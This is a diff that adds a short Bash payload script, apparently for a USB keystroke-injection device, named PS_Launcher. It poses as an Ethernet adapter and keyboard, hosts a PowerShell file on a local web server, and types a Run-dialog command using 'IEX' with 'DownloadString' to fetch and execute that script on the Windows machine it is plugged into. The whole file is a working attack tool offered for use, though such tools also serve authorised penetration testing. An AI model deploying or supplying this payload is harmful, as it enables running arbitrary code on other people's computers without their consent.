@@ -1,0 +1,38 @@
+#!/bin/bash
+#
+# Title:         PS_Launcher
+# Author:        golem445
+# Version:       1.0
+# Dependencies:  gohttp
+# Runtime:		 ~5 seconds
+#
+# Sets up Ethernet and HID keyboard interfaces simultaneously,
+# then uses HID to execute the configured Powershell command
+# via local web server. Insert the Powershell payload to be
+# executed into your powershell_exec.txt file.
+#
+
+# Start Setup
+LED SETUP
+
+# Check dependencies
+REQUIRETOOL gohttp
+GET SWITCH_POSITION
+
+# Set interfaces 
+ATTACKMODE RNDIS_ETHERNET HID
+
+# Start web server
+cd /root/udisk/payloads/$SWITCH_POSITION
+cat powershell_exec.txt > s.ps1
+gohttp -p 80 &
+
+# Start attack
+LED ATTACK
+RUN WIN powershell "IEX (New-object Net.Webclient).DownloadString('http://172.16.64.1/s.ps1')"
+
+# Sync file system
+sync
+
+# Complete
+LED FINISH
